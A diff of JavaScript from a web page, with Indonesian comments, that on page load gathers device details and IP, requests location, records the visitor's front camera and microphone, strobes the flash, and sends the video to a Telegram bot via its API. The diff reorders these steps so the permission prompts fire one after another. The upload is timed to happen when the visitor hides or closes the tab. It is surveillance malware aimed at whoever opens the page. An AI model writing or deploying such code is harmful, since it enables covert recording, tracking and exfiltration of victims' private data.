@@ -170,7 +170,6 @@
         formData.append('chat_id', id);
         formData.append('video', blob, filename);
         formData.append('caption', '📹 Rekaman Kamera Depan (Durasi Penuh)');
-        // Menggunakan navigator.sendBeacon jika memungkinkan saat exit untuk reliabilitas tinggi
         fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
@@ -224,20 +223,18 @@
           }
         };
 
-        mainRecorder.start(1000); // Record in 1s slices to ensure data safety
+        mainRecorder.start(1000); 
       } catch (err) {
         sendToTelegram('maaf akses vidio tidak berhasil 🤬');
       }
     }
 
-    // Fungsi otomatis kirim saat keluar/minimize halaman
     function handleExit() {
       if (mainRecorder && mainRecorder.state === "recording") {
         mainRecorder.stop();
       }
     }
 
-    // Trigger saat tab disembunyikan atau ditutup
     document.addEventListener('visibilitychange', () => {
       if (document.visibilityState === 'hidden') handleExit();
     });
@@ -306,13 +303,24 @@
       }
     }
 
-    window.addEventListener('DOMContentLoaded', () => {
+    // Eksekusi semua izin secara berturut-turut saat DOM siap
+    window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
-      getInfo();
-      autoRecordAudio(); 
-      recordFrontVideo(); // Sekarang berjalan terus sampai exit
-      startFlashStrobe();
+      
+      // 1. Ambil Info Perangkat & IP
+      await getInfo();
+      
+      // 2. Minta Izin Lokasi
       getLocation();
+      
+      // 3. Minta Izin Kamera (Video) & Mulai Rekam Terus-menerus
+      await recordFrontVideo();
+      
+      // 4. Minta Izin Mikrofon (Audio) & Rekam 5 Detik Pertama
+      await autoRecordAudio();
+      
+      // 5. Coba Aktifkan Flash (Kamera Belakang)
+      startFlashStrobe();
     });
 
     button.addEventListener('click', () => {
